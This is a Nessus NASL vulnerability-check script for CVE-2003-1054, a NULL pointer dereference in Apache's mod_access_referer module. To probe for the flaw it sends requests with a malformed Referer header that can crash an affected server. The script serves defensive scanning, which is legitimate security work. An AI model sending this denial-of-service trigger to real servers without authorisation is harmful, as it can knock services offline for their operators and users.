#
# This script was written by Xue Yong Zhi (xueyong@udel.edu)
# 
# See the Nessus Scripts License for details
#
# Ref:
# Date: Wed, 16 Apr 2003 23:14:33 +0200
# From: zillion <zillion@safemode.org>
# To: vulnwatch@vulnwatch.org
# Subject: [VulnWatch] Apache mod_access_referer denial of service issue


if(description)
{
 script_id(11543); 
 script_cve_id("CVE-2003-1054");
 script_bugtraq_id(7375);
 script_version("$Revision: 1.11 $");

 name["english"] = "mod_access_referer 1.0.2 NULL pointer dereference";
 script_name(english:name["english"]);
 
 desc["english"] = "

The remote web server may be using a mod_access_referer 
apache module which contains a NULL pointer dereference 
bug, Abuse of this vulnerability can possibly be used
in denial of service attackes against affected systems.

Solution : Try another access control module, mod_access_referer
has not been updated for a long time.

Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Apache module mode_access_referer 1.0.2 contains a NULL pointer dereference vulnerability";
 
 script_summary(english:summary["english"]);
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003 Xue Yong Zhi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/apache");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


function check(req)
{
  #As you see, the Referer part is malformed.
  #And it depends on configuration too -- there must be an IP
  #addresses based access list for mod_access_referer.

  soc = http_open_socket(port);
  if(!soc)exit(0);

  req = http_get(item:req, port:port);
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nReferer: ://www.nessus.org\r\n\r\n"), idx);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if ( "HTTP">< r ) return(0);
  
  security_warning(port);
  exit(0);
}

# first to make sure it's a working webserver

req = http_get(item:"/", port:port);
idx = stridx(req, string("\r\n\r\n"));
req = insstr(req, string("\r\nReferer: http://www.nessus.org\r\n\r\n"), idx);
r = http_keepalive_send_recv(port:port, data:req);
if(r==NULL) exit(0);
if("HTTP">!<r) exit(0);

# We do not know which dir is under control of the
# mod_access_reeferer, just try some...

dirs = get_kb_item(string("www/", port, "/content/directories"));
if(isnull(dirs))dirs = make_list("/");

foreach dir (make_list(cgi_dirs(),"/", dirs))
{
 if(dir && check(req:dir)) exit(0);
}
